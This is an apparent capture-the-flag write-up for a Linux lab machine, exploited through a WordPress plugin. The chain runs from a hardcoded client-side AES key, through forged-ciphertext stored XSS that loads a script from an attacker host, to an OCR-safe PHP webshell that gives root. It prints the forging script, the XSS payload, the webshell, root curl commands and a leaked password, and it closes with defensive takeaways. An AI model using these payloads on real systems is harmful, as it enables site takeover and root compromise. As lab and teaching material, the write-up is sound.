MakeSense

Medium Linux ✓ Pwned
Date 2026-07-05
OS Linux — Ubuntu 24.04 (kernel 6.8)
Stack WordPress (SQLite) · custom "webagency" theme (Transformers.js / Whisper) · Apache 2.4.58 · root PHP + Tesseract OCR service
CVE None — custom application logic (client-trusted crypto → stored XSS → OCR file-write RCE)

Summary

MakeSense is a chain built entirely on misplaced trust in the client — no public CVE, just an application that hands the browser things a browser should never be given. A "voice call" widget on a WordPress site ships its own AES key and does its own sanitisation, so we forge a submission and land a stored XSS against an automated admin. From there it's a WordPress admin-to-RCE, credential reuse, and finally a delightfully weird privesc: a root-owned OCR service that writes recognised text to a .php file — so we hand Tesseract a webshell.

  1. Initial access — the theme's whisper-wrapper.js contains a hardcoded AES-GCM key and encrypts a user "voice message" client-side. We forge our own encrypted payload with an XSS body, store it via two unauthenticated AJAX actions, and an admin bot renders it in wp-admin → stored XSS creates an administrator → malicious plugin upload → shell as www-data.
  2. Lateral movement — wp-config.php leaks walter's DB password, reused for SSH → user.txt.
  3. Privilege escalation — a root php -S OCR service (loopback, Basic-auth) saves OCR output to a web-served .php file. Tesseract can't read _ ' " ` *, so we write a webshell using only OCR-safe characters (chr() + $GLOBALS) → code execution as root.

Initial Access — Client-Trusted Crypto → Stored XSS

The theme's "Call us" feature records audio, transcribes it in-browser with Transformers.js/Whisper, and submits the result. Reading whisper-wrapper.js hands us the entire intended vulnerability:

// whisper-wrapper.js
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';   // symmetric key, in the browser

// Map spoken words to their symbol equivalents for XSS injection   ← their own comment
const mappings = { 'open bracket':'<', 'close bracket':'>', 'slash':'/', 'quote':"'", ... };

async encryptPayload(payload) {
  const keyMaterial = await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
  const iv = crypto.getRandomValues(new Uint8Array(12));           // 12-byte IV, AES-GCM
  const encrypted = await crypto.subtle.encrypt({name:'AES-GCM', iv}, key, data);
  // returns base64( IV || ciphertext || tag )
}

Two design decisions doom this: (1) the symmetric key lives in client JavaScript, and (2) a function literally named for "XSS injection" turns transcribed words into HTML symbols. The encrypted blob is posted to two unauthenticated AJAX actions whose nonce is printed in the page source:

save_voice_raw       → creates a post, returns post_id
save_voice_results   → decrypts {transcription, summary} and stores it as a `contact_submission`

Because we hold the key and the wire format, the microphone and Whisper are irrelevant — we forge the ciphertext directly, putting an XSS string where the "transcription" should be:

import json, base64, hashlib, requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY  = hashlib.sha256(b'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI').digest()
BASE = 'https://makesense.htb'; NONCE = '4c58dec735'          # nonce from page source

def enc(p):
    iv = get_random_bytes(12)
    ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=iv).encrypt_and_digest(json.dumps(p).encode())
    return base64.b64encode(iv + ct + tag).decode()

xss = "<img src=x onerror=\"s=document.createElement('script');"\
      "s.src='http://10.10.14.9:8000/x.js';document.head.appendChild(s)\">"
pid = requests.post(f'{BASE}/wp-admin/admin-ajax.php',
        data={'action':'save_voice_raw','nonce':NONCE}, verify=False).json()['data']['post_id']
requests.post(f'{BASE}/wp-admin/admin-ajax.php', verify=False,
        data={'action':'save_voice_results','nonce':NONCE,'post_id':pid,
              'encrypted_payload': enc({'transcription':xss,'summary':xss})})

The submission is a contact_submission post — not public (a direct hit returns 404), but reviewed inside wp-admin by an automated admin (a headless Chrome / Selenium bot, prey-unified.py). When the bot opens the submissions list, our <img onerror> fires in an authenticated admin session and pulls x.js, which uses the admin's own session to create a new administrator:

Privilege Escalation — Feeding Tesseract a Webshell

The :8001 service is a handwriting-OCR web app running as root, behind HTTP Basic auth — and walter's password is reused there too. It's a canvas you draw on; the backend OCRs the image with Tesseract and lets you "Save as <filename>". Two facts make this fatal:

  • The saved file's content is the OCR'd text, and it lands in /root/ocr4/saved/ — which the root php -S server executes as PHP.
  • The filename is basename()-sanitised (no path traversal), but the .php extension is allowed.

So if I can get Tesseract to output valid PHP, I can save saved/x.php and request it for root RCE. Proof of concept — an image of <?php echo 123; ?> round-trips perfectly and executes:

# recognise an image of "<?php echo 123; ?>", save as shell.php
curl -s -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/saved/shell.php
123                       # ← PHP ran, as root

The catch: Tesseract is lossy on symbols. Testing a real webshell, the OCR mangles exactly the characters PHP needs most:

<?php system($_GET[0]);?>   →   <?php system($ GET[O]) ;?>      # "_" dropped, "0"→"O"
<?php echo `id`;?>          →   <?php echo 'id* ;?>             # backticks → quote + "*"

Underscores, single/double quotes, backticks and asterisks are unreliable. The trick is to write a webshell using only OCR-safe characters — no quotes, no underscores, no backticks. Build every needed string with chr() and reach the $_GET superglobal indirectly through $GLOBALS:

<?php system($GLOBALS[chr(95).chr(71).chr(69).chr(84)][1]);?>
                     └ '_'    'G'    'E'    'T' ┘        └ ?1=<cmd>

That uses only < ? p h p ( ) [ ] . ; digits letters — all of which Tesseract reads cleanly. Render it, verify the recognised text before saving, save as r2.php, and we have a reusable root webshell:

root shell
walter@makesense:~$ curl -s -u walter:… 'http://127.0.0.1:8001/saved/r2.php?1=id'
uid=0(root) gid=0(root) groups=0(root)
walter@makesense:~$ curl -s -u walter:… 'http://127.0.0.1:8001/saved/r2.php?1=cat%20/root/root.txt'
HTB{… redacted …}

From here, ?1= runs any command as root — drop an SSH key into /root/.ssh/authorized_keys for a stable root shell.

Defensive Takeaways

  • The client is not your server. A key in JavaScript is a public key, and client-side sanitisation is a suggestion. Anything the browser can do, an attacker can do directly — decrypt, re-encrypt, skip. Encrypt and validate on the server, treating all client input as hostile. More in my notes on client-side trust.
  • Output-encode stored content, always. The XSS worked because a submission was rendered into the admin dashboard unescaped. Context-aware encoding (and a CSP) in wp-admin would have neutralised the whole first half of the chain — even for an "internal" review page.
  • Automated reviewers are a live attack surface. A headless-browser bot that opens user-supplied content is a victim for stored XSS. Sandbox it, strip its privileges, and never review untrusted HTML in an authenticated admin context.
  • Never reuse secrets across trust boundaries. One password served the (unused) DB config and SSH and the OCR Basic-auth. Reuse turned two dead-ends into a full path.
  • Don't run helper services as root, and don't let user input choose filenames or extensions. The OCR app should have run unprivileged, written to a non-executable directory, and pinned a safe extension. Any one of those breaks the privesc. (And 127.0.0.1 didn't save it — see localhost is not a boundary.)
